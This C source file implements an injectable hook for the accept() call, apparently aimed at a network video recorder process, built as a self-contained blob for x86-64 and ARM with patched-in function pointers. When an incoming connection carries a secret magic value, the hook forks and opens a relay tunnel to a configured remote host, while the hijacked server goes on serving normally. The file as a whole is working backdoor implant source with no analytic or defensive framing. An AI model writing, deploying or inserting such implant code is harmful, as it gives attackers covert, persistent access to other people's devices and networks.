#include "hook/accept_hook.h"

#include <sys/socket.h>
#include <netinet/in.h>
#include <poll.h>
#include <sys/time.h>
#include <stdint.h>

#ifdef __arm__
#  define HOOK_ATTR __attribute__((section(".text.hook"), noinline, used, target("arm")))
#else
#  define HOOK_ATTR __attribute__((section(".text.hook"), noinline, used))
#endif

typedef int  (*accept_fn_t)      (int, struct sockaddr *, socklen_t *);
typedef int  (*fork_fn_t)        (void);
typedef int  (*socket_fn_t)      (int, int, int);
typedef int  (*connect_fn_t)     (int, const struct sockaddr *, socklen_t);
typedef int  (*recvfrom_fn_t)    (int, void *, int, int, struct sockaddr *, socklen_t *);
typedef int  (*sendto_fn_t)      (int, const void *, int, int,
                                  const struct sockaddr *, socklen_t);
typedef int  (*poll_fn_t)        (struct pollfd *, unsigned int, int);
typedef int  (*close_fn_t)       (int);
typedef void (*exit_fn_t)        (int);
typedef int  (*getsockname_fn_t) (int, struct sockaddr *, socklen_t *);
typedef int  (*setsockopt_fn_t)  (int, int, int, const void *, socklen_t);

/* ================================================================== */
/* Asm entry — MUST be first in .text.hook so the injected blob starts */
/* here and the forward bl/call to hook_accept_body is correct.        */
/* ================================================================== */

#if defined(__x86_64__)

__attribute__((naked, section(".text.hook")))
void hook_accept(void)
{
    __asm__ volatile(
        /* rdi=sockfd  rsi=addr  rdx=addrlen — already set by caller.
         * rcx = 4th arg = config ptr (patched magic).
         * push rbx for 16-byte stack alignment (ret addr already pushed). */
        "push %%rbx\n\t"
        "movabs $0xDEADBEEFCAFEBABE, %%rcx\n\t"  /* HOOK_CONFIG_MAGIC — patched */
        "call hook_accept_body\n\t"
        "pop %%rbx\n\t"
        "ret\n\t"
        ::: );
}

#elif defined(__arm__)

__attribute__((naked, section(".text.hook"), target("arm")))
void hook_accept(void)
{
    __asm__ volatile(
        ".arm\n\t"
        /* r0=sockfd  r1=addr  r2=addrlen — already set by caller.
         * r3 = 4th arg = config ptr (patched magic).
         * push {r4,lr}: r4 is a dummy for 8-byte stack alignment. */
        "push {r4, lr}\n\t"
        "ldr r3, .Lconfig_magic\n\t"              /* HOOK_CONFIG_MAGIC — patched */
        "bl hook_accept_body\n\t"
        "pop {r4, pc}\n\t"
        ".balign 4\n\t"
        ".Lconfig_magic: .word 0xDEADBEEF\n\t"
        ".ltorg\n\t"
        ::: );
}

#else
#  error "hook/accept_hook: unsupported architecture"
#endif

/* ================================================================== */
/* Debug helper — raw write(2) syscall, no libc needed.               */
/* ================================================================== */

#ifdef DEBUG_HOOK
/* Write a single char to fd 2 using the raw write syscall.
 * Stores the char on the stack — no .rodata reference, safe in injected blob. */
# if defined(__x86_64__)
HOOK_ATTR
static void dbg_char(char c) {
    char buf[2]; buf[0] = c; buf[1] = '\n';
    __asm__ volatile("syscall"
        : : "a"(1L), "D"(2L), "S"(buf), "d"(2L) : "rcx", "r11", "memory");
}
# elif defined(__arm__)
HOOK_ATTR
static void dbg_char(char c) {
    char buf[2]; buf[0] = c; buf[1] = '\n';
    register int        r0 __asm__("r0") = 2;
    register const char *r1 __asm__("r1") = buf;
    register int        r2 __asm__("r2") = 2;
    register int        r7 __asm__("r7") = 4;
    __asm__ volatile("swi #0" : "+r"(r0) : "r"(r1), "r"(r2), "r"(r7) : "memory");
}
# endif
# define DBG(c) dbg_char(c)
#else
# define DBG(c) ((void)0)
#endif

/* ================================================================== */
/* C body — comes after the entry so the blob copy includes both.     */
/* All libc calls go through cfg->fn_* — zero external references.   */
/* ================================================================== */

HOOK_ATTR
static int hook_accept_body(int sockfd, struct sockaddr *addr, socklen_t *addrlen,
                             struct hook_config *cfg)
{
    accept_fn_t      real_accept    = (accept_fn_t)     (uintptr_t)cfg->real_accept;
    fork_fn_t        do_fork        = (fork_fn_t)        (uintptr_t)cfg->fn_fork;
    socket_fn_t      do_socket      = (socket_fn_t)      (uintptr_t)cfg->fn_socket;
    connect_fn_t     do_connect     = (connect_fn_t)     (uintptr_t)cfg->fn_connect;
    recvfrom_fn_t    do_recvfrom    = (recvfrom_fn_t)    (uintptr_t)cfg->fn_recvfrom;
    sendto_fn_t      do_sendto      = (sendto_fn_t)      (uintptr_t)cfg->fn_sendto;
    poll_fn_t        do_poll        = (poll_fn_t)        (uintptr_t)cfg->fn_poll;
    close_fn_t       do_close       = (close_fn_t)       (uintptr_t)cfg->fn_close;
    exit_fn_t        do_exit        = (exit_fn_t)        (uintptr_t)cfg->fn_exit;
    getsockname_fn_t do_getsockname = (getsockname_fn_t) (uintptr_t)cfg->fn_getsockname;
    setsockopt_fn_t  do_setsockopt  = (setsockopt_fn_t)  (uintptr_t)cfg->fn_setsockopt;

    /* A=entering, a=accepted, P=port-ok, p=port-mismatch, T=setsockopt,
     * K=peek-ok, k=peek-short, M=magic-ok, m=magic-mismatch,
     * !!=fork-failed, F=fork-parent, C=fork-child,
     * S=socket-ok, s=socket-fail, N=connect-ok, n=connect-fail, R=relay */
    DBG('A');
    int local_fd = real_accept(sockfd, addr, addrlen);
    if (local_fd < 0)
        return local_fd;
    DBG('a');

    /* port scoping: only intercept connections on the configured local port */
    if (cfg->local_port) {
        struct sockaddr_in sin;
        socklen_t slen = sizeof(sin);
        if (do_getsockname(local_fd, (struct sockaddr *)&sin, &slen) == 0)
            if (sin.sin_port != cfg->local_port) {
                DBG('p');
                return local_fd;
            }
    }
    DBG('P');

    /* 1s recv timeout so MSG_PEEK never blocks forever on idle connections */
    struct timeval tv;
    tv.tv_sec  = 1;
    tv.tv_usec = 0;
    do_setsockopt(local_fd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
    DBG('T');

    /* peek 8 bytes: 4-byte NVR preamble + 4-byte magic */
    uint8_t peek[8];
    if (do_recvfrom(local_fd, peek, 8, MSG_PEEK, 0, 0) != 8) {
        DBG('k');
        return local_fd;
    }
    DBG('K');

    /* compare bytes [4..7] against config magic */
    uint32_t got_magic, cfg_magic;
    __builtin_memcpy(&got_magic, peek + 4, 4);
    __builtin_memcpy(&cfg_magic, cfg->magic, 4);
    if (got_magic != cfg_magic) {
        DBG('m');
        return local_fd;
    }
    DBG('M');

    int pid = do_fork();
    if (pid < 0) {
        DBG('!');
        return local_fd;
    }

    if (pid != 0) {
        DBG('F');
        do_close(local_fd);
        return real_accept(sockfd, addr, addrlen);
    }

    /* child: establish the tunnel */
    DBG('C');
    int remote_fd = do_socket(AF_INET, SOCK_STREAM, 0);
    if (remote_fd < 0) {
        DBG('s');
        goto child_exit;
    }
    DBG('S');

    struct sockaddr_in remote;
    remote.sin_family      = AF_INET;
    remote.sin_port        = cfg->remote_port;
    remote.sin_addr.s_addr = cfg->remote_ip;

    if (do_connect(remote_fd, (struct sockaddr *)&remote, sizeof(remote)) < 0) {
        DBG('n');
        goto child_exit;
    }
    DBG('N');
    DBG('R');

    /* consume the 8 peeked bytes (preamble + magic) */
    do_recvfrom(local_fd, peek, 8, 0, 0, 0);

    /* relay loop — poll() has no fd-number limit unlike select() */
    for (;;) {
        struct pollfd fds[2];
        fds[0].fd = local_fd;  fds[0].events = POLLIN; fds[0].revents = 0;
        fds[1].fd = remote_fd; fds[1].events = POLLIN; fds[1].revents = 0;

        if (do_poll(fds, 2, -1) <= 0)
            break;

        uint8_t buf[1400];

        if (fds[0].revents & POLLIN) {
            int r = do_recvfrom(local_fd, buf, sizeof(buf), 0, 0, 0);
            if (r <= 0) break;
            do_sendto(remote_fd, buf, r, 0, 0, 0);
        }
        if (fds[1].revents & POLLIN) {
            int r = do_recvfrom(remote_fd, buf, sizeof(buf), 0, 0, 0);
            if (r <= 0) break;
            do_sendto(local_fd, buf, r, 0, 0, 0);
        }
    }

child_exit:
    do_close(local_fd);
    do_close(remote_fd);
    do_exit(0);
    __builtin_unreachable();
}

/* ================================================================== */
/* End-of-blob marker — must be last in .text.hook.                   */
/* ================================================================== */
__asm__(
    ".section .text.hook, \"ax\"\n\t"
    ".globl hook_blob_end\n\t"
    "hook_blob_end:\n\t"
    ".previous\n\t"
);
